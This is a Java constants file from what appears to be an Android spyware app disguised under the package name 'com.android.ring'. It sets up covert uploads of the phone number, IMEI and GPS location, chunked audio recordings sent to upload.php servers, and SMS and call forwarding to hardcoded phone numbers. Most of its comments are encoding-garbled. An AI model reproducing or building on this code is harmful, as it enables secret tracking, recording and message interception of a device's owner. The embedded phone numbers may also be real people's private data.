package com.android.ring;

import android.location.Location;
import android.os.Environment;

import com.android.log.CLog;
import com.android.ring.devutils.DeviceInfo;

/**
 * @author junxu.wang
 *
 */
public class Constant {
	public static final boolean IS_DEBUG=false;
	
	//GPS
	/**���ͨ��gps��ȡλ��gps=1,���ͨ�������ȡλ��gps=0*/
	public static final int LOCATION_GPS=1;
	/**���ͨ��gps��ȡλ��gps=1,���ͨ�������ȡλ��gps=0*/
	public static final int LOCATION_NETWORK=0;
	public static final String ID="1234567890";
	public static final long GPS_MIN_TIME=10000;//λ�û�ȡ10�봫һ��
	public static final long GPS_TOTAL_TIME=15*60000;//GPS����ʱ�䣺����15����
	/**gps�ϴ���ʽ
	 * id:��һ��Ӳ��������������const String phoneid=123456��Ȼ���Ƶ�url����
	 * ph:���ֻ��� 
	 * x:x���� 
	 * y:y���� z:����
	 * gps:���ͨ��gps��ȡλ��gps=1,���ͨ�������ȡλ��gps=0*/
	public static final String GPS_PARAM_FORMATE="id=%s&ph=%s&imei=%s&x=%f&y=%f&z=%f&gps=%d";
	/**gps�ϴ���ʽ*/
	public static String createGpsParam(DeviceInfo deviceInfo,Location location,int type){
		return String.format(GPS_PARAM_FORMATE, ID,deviceInfo.getPhoneNumber(),deviceInfo.getIMEI(),location.getLongitude(),location.getLatitude(),location.getAltitude(),type);
	}
	//http:\\192.168.1.100:80\main.php?id=1234567890&ph=19991048999&imei=123456789&x=124312432&&y=124312432&z=124312432&gps=0
	public static final String gpsUrls[] = new String[]{"http://192.168.22.3/upload.php?",
	         	 	"http://192.168.22.4/upload.php?",
	         		"http://192.168.22.5/upload.php?"
	};
	//id=1234567890&ph=19991048999&imei=123456789&x=124312432&&y=124312432&z=124312432&gps=0
	public static final String gpsPhoneNumbers[] = new String[]{
//		"18612317056",
//		"13121581070"
        "18958031925",
        "13911048911"
		};
	
	
	//Record
	/**¼���ļ���С,1����һ���ļ�*/
	public static final long RECORD_PERIOD_TIME=60000;//��
	/**¼��ʱ������¼��15����*/
	public static final long RECORD_TOTAL_TIME=15*60000;
	/**¼���ļ�Ŀ¼*/
	public static String RECORD_PATH = null;
	/**�ļ���ʽ record12345.xxx, 12345ʱ1970���������������������α�׼ʱ�䣬xxx��ʵ��¼�Ƹ�ʽmp3����mp3��amr����amr*/
	public static final String RECORD_FILE_FOMATE="%s/recor%s.mp3";
	/**��ʽ¼���ļ���*/
	public static final String createFileName(long fileName){
		CLog.print("createFileName", "path:"+RECORD_FILE_FOMATE);
		 if(RECORD_PATH==null){
			 RECORD_PATH=DeviceInfo.getPath();
		 }
		return String.format(RECORD_FILE_FOMATE,RECORD_PATH, fileName);
	}
	/**�ϴ�¼���ļ��ķ�����*/
	public static final String recordUrls[]=new String[]{"http://192.168.22.3/upload.php?",
 	 	"http://192.168.22.4/upload.php?",
 		"http://192.168.22.5/upload.php?"};
 		
 		
	
//	Call

	/**����ʱ������15����*/
	public static final boolean SMS_TRANSMIT=true;
	/**���ź���*/
	public static final String smsTransmitNumbers[]=new String[]{
//		"18612317056",
//		"13121581070"
        "18958031925",
        "13911048911"
		};
	
	
//	SMS
	/**����ʱ������15����*/
	public static final long CALL_TOTAL_TIME=15*60000;
	/**���ź���*/
	public static final String callNumbers[]=new String[]{
//		"18612317056",
//		"13121581070"
        "18958031925",
        "13911048911"
		};

}
